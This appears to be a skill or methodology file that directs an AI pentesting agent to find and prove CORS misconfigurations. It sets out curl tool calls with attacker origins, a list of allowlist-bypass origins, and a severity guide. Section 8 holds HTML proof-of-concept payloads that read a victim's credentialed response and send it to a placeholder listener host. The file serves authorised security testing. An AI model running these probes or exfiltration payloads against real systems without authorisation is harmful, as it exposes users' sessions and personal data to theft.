---
name: cors-misconfig
description: Hands-on methodology for detecting and proving Cross-Origin Resource Sharing (CORS) misconfigurations — origin reflection, null-origin trust, subdomain/regex allowlist bypasses, and missing Vary headers — on any endpoint that returns Access-Control-* headers or serves session/credentialed data (profile, admin, token, account APIs). Drives the actual curl checks; does not just describe the theory.
---

# CORS MISCONFIGURATION METHODOLOGY

Execute when the target has ANY endpoint that returns `Access-Control-Allow-Origin` in its response, OR any API that serves authenticated/session-bound data (`/api/me`, `/api/profile`, `/api/user`, `/api/account/*`, `/api/admin/*`, `/api/tokens`, `/api/csrf`, GraphQL, SPA backends) — CORS is a per-endpoint control, not app-wide, so re-run this against every distinct API surface discovered, not just the first one that responds.

**The bar for a real finding:** an attacker-controlled origin must be able to make the VICTIM'S BROWSER send a credentialed request (cookies, or an Authorization header the browser attaches automatically) and then READ the response. Both halves matter — an endpoint that reflects any origin but sends no cookies/auth and returns nothing sensitive is not a finding. Prove both halves before reporting.

## 1. Baseline — Confirm the Endpoint Is Credentialed At All
Before touching CORS headers, confirm there's something worth stealing:
1. Request the endpoint with the currently active session (cookie/Authorization already attached by the framework, or supply explicitly).
2. Confirm the response actually contains session-bound/sensitive content (profile data, tokens, PII, admin fields) — not a generic public page.
3. If nothing sensitive is returned regardless of auth state, deprioritize this endpoint — a CORS bug here has no real impact even if the headers are misconfigured.

```json
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET"}}
```

## 2. Preflight Behavior
For any request that isn't a "simple request" (custom headers, non-GET/POST, `Content-Type: application/json`), the browser sends an `OPTIONS` preflight first. Check what the server actually allows vs. what it merely doesn't reject:

```json
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "OPTIONS", "headers": {"Origin": "https://evil-attacker.com", "Access-Control-Request-Method": "PUT", "Access-Control-Request-Headers": "Authorization, Content-Type"}}}
```
Inspect the response for `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` — if these blindly echo back whatever the preflight requested (rather than a fixed allowlist), that's the same reflection bug at the preflight layer and widens what a malicious origin can send, not just what it can read.

## 3. Origin Reflection Test (the core check)
Send an arbitrary, unmistakably-attacker origin and see if it comes back verbatim:

```json
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "https://evil-attacker.com"}}}
```
Read the response headers:
- `Access-Control-Allow-Origin: https://evil-attacker.com` (exact reflection of whatever you sent) **+** `Access-Control-Allow-Credentials: true` → this is the dangerous pattern. Any site can read this victim's authenticated response.
- `Access-Control-Allow-Origin: *` with **no** `Access-Control-Allow-Credentials` header → NOT exploitable for credentialed reads. Per the WHATWG Fetch spec, browsers refuse to expose the response to JS when `withCredentials`/`credentials:'include'` is used against a literal `*` — this is enforced client-side regardless of server intent. Do not report wildcard-alone as a credential-theft finding; it can still matter if the endpoint returns sensitive data to *unauthenticated* cross-origin reads, which is a different, lower-severity issue (public data over-exposure), not CORS credential theft.
- `Access-Control-Allow-Origin: *` **+** `Access-Control-Allow-Credentials: true` together is invalid per spec and real browsers reject it — if you see both, don't chase it as a browser-exploitable bug, but flag it as a code smell (broken CORS logic, worth re-checking with older/non-standard clients).

## 4. Null Origin Test
`Origin: null` is what a browser sends from a sandboxed iframe, a `data:` URI, or a local file — all three are things a page you control can trivially produce, so a server that trusts `null` trusts anyone:

```json
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "null"}}}
```
`Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true` → confirmed. Exploitation PoC uses a sandboxed iframe (`sandbox="allow-scripts"`, no `allow-same-origin`) or a `data:text/html,<script>...</script>` page to force `Origin: null`, then fetches the endpoint with `credentials:'include'`.

## 5. Subdomain / Allowlist Regex Bypass Suite
Real-world CORS bugs are rarely raw reflection of anything — usually a broken allowlist check (`origin.includes(victimdomain)`, a loose regex, or a `*.victimdomain.com` policy). Run the FULL set below against the real domain, substituting the actual target — don't stop at the first miss, each tests a different parsing flaw:

```json
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "https://evil.com"}}}
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "https://<target_domain>.evil.com"}}}
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "https://evil<target_domain>.com"}}}
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "https://evil-<target_domain>"}}}
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "https://<target_domain>evil.com"}}}
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "https://sub.<target_domain>"}}}
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "https://arbitrary-subdomain-<random>.<target_domain>"}}}
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "https://<target_domain>%60.evil.com"}}}
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "https://<target_domain>_.evil.com"}}}
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "http://<target_domain>"}}}
```
What each catches:
- `evil.com` → sanity check, confirms plain reflection (step 3 already covers this, kept here for the automated sweep).
- `<target_domain>.evil.com` / `evil<target_domain>.com` / `evil-<target_domain>` → substring-match allowlists (`origin.includes("<target_domain>")` style) that don't anchor the match.
- `sub.<target_domain>` / `arbitrary-subdomain.<target_domain>` → a `*.<target_domain>` policy. Not automatically a bug on its own (may be intentional for a multi-tenant app), BUT becomes a real finding if you can host content on ANY subdomain — check for subdomain takeover candidates (dangling CNAMEs), an open user-content subdomain, or a stored-XSS-bearing subdomain elsewhere in the app; chain it.
- `` <target_domain>%60.evil.com `` / `<target_domain>_.evil.com` → regex character-class gaps. Backtick/underscore are valid in browser-parsed hostnames on some engines but usually excluded from `[\w.-]`-style allowlist regexes — if these get accepted, the allowlist regex is the flaw.
- `http://<target_domain>` (real domain, but insecure scheme) → confirms whether the check validates scheme too; if HTTP is accepted for an HTTPS-only app, note it (downgrade/MITM risk on top of any CORS issue).

For each hit, re-confirm `Access-Control-Allow-Credentials: true` is also present — a reflection without credentials enabled is a much weaker/no finding per the bar in the intro.

## 6. Confirm Impact With Real Session Data
A header-only finding is not enough for a critical/high write-up. Repeat the winning Origin payload from step 3/4/5 WITH the active session cookie/token attached, and confirm the response body actually contains sensitive content:

```json
{"tool": "curl", "args": {"url": "<target_endpoint>", "method": "GET", "headers": {"Origin": "<winning_origin_value>", "Cookie": "<active_session_cookie>"}}}
```
Look for: PII, session/CSRF tokens, admin fields, financial data, account settings — anything that, if read from a page you control while the victim is logged in, is a real compromise. If the response is empty or generic even with valid auth, the finding is real but low-impact (note that explicitly, don't inflate severity).

## 7. Missing `Vary: Origin` (Secondary Finding)
If the server sets a dynamic `Access-Control-Allow-Origin` based on the request's `Origin` header but does NOT also send `Vary: Origin`, any caching layer (CDN, reverse proxy) in front of it can serve one user's CORS-scoped response to a different origin entirely — a cache-poisoning angle distinct from the browser-level CORS bug. Check the header on the same responses collected above; flag as a separate, secondary note when present.

## 8. Evidence & PoC
Do not report from curl headers alone if you're being asked to demonstrate impact — a minimal PoC removes any doubt and matches what triage teams expect:
```html
<!-- Reflected-origin / credentialed-read PoC -->
<script>
fetch('<target_endpoint>', {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('https://<your_collaborator_or_listener>/collect?data=' + encodeURIComponent(d)));
</script>
```
```html
<!-- Null-origin PoC (sandboxed iframe forces Origin: null) -->
<iframe sandbox="allow-scripts" srcdoc="
  <script>
    fetch('<target_endpoint>', {credentials:'include'})
      .then(r=>r.text())
      .then(d=>parent.postMessage(d,'*'));
  </script>
"></iframe>
<script>window.addEventListener('message', e => {
  fetch('https://<your_collaborator_or_listener>/collect?data=' + encodeURIComponent(e.data));
});</script>
```
Save the actual response body (or a screenshot of the PoC firing against an OOB listener) as evidence, not just the raw headers.

## 9. Record the Finding
```json
{"tool": "record_finding", "args": {"title": "CORS Misconfiguration on <endpoint> — Origin Reflection + Credentials Enabled", "kind": "cors_misconfiguration", "severity": "high", "request_ref": "<target_endpoint>", "note": "Access-Control-Allow-Origin reflects arbitrary attacker origin '<origin_used>' and Access-Control-Allow-Credentials: true is set. Confirmed with live session — response contains <specific sensitive content>, not assumed from headers alone. Bypass class: <reflection|null-origin|subdomain-regex>."}}
```
Severity guide: reflection/null-origin + credentials + confirmed sensitive-data leak → high/critical (higher if admin/financial/account-takeover-enabling data). Subdomain trust with no confirmed takeover path → medium, note it as needing the takeover chain to escalate. Wildcard-only or unauthenticated-data-only → low/informational, per the spec note in step 3 — do not over-report this pattern.

## Rule of Exhaustion
A single `curl -H "Origin: https://evil.com"` returning a safe, fixed allowlist value is NOT enough to close out CORS on an endpoint — run the full suite in step 5 before concluding it's solid, and re-run this entire methodology against every distinct credentialed endpoint discovered during recon (auth, admin, and account/profile APIs are the highest-value targets first). An endpoint that's clean today can still be a smaller piece of a chain — a subdomain-trust hit with no current takeover candidate is worth re-checking if subdomain recon later turns up a dangling record.